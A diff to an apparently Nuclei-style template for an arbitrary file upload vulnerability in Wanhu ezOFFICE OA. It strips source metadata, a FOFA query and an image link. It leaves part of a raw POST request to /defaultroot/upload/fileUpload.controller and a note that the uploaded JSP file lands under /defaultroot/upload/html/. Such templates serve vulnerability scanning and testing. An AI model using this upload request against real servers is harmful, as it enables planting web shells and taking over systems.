@@ -3,12 +3,8 @@ info:
   name: 万户OA-fileUpload.controller任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/geqe3tx1k2qv68ee'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: geqe3tx1k2qv68ee
-    fofa: app="万户ezOFFICE协同管理平台"
 http:
 - raw:
   - 'POST /defaultroot/upload/fileUpload.controller HTTP/1.1
@@ -41,7 +37,6 @@ http:
 
     --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413531487-dae2cefc-63f9-444c-82ee-725fa746e9a2.png)
 
     文件路径 /defaultroot/upload/html/xxxxxxxxxx.jsp'
   redirects: false
